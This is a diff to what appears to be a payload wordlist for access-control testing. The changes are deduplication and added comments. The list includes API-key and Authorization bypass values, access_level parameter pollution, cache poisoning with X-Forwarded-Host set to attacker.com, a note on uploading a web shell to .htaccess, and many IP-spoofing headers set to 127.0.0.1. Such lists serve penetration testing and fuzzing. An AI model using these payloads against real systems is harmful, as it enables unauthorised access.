@@ -204,6 +204,7 @@ code=
 # API key bypass
 api_key=
 X-API-Key: 
+# Empty Authorization header, also listed under JWT.
 Authorization: 
 apikey=null
 
@@ -402,6 +403,7 @@ access_level=1&access_level=99
 # Upload web shell to /admin/.htaccess
 
 # Authentication bypass via cache poisoning
+# Same header as the password-reset section; repeated here for cache poisoning.
 X-Forwarded-Host: attacker.com
 # Cache the response and serve to all users
 
@@ -457,7 +459,6 @@ X-Method-Override: GET
 # ============================================
 
 # IP spoofing / access control bypass headers
-X-Forwarded-For: 127.0.0.1
 X-Forwarded-For-Original: 127.0.0.1
 X-Forward-For: 127.0.0.1
 X-Forwarder-For: 127.0.0.1
@@ -471,14 +472,10 @@ X-Forwarded-Port: 80
 X-Forwarded-Port: 443
 X-Forwarded-Port: 8080
 X-Forwarded-Port: 8443
-X-Client-IP: 127.0.0.1
 X-Real-Ip: 127.0.0.1
 X-Remote-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
 X-Original-Remote-Addr: 127.0.0.1
-X-Originating-IP: 127.0.0.1
 X-True-IP: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
 Client-IP: 127.0.0.1
 Real-Ip: 127.0.0.1
 
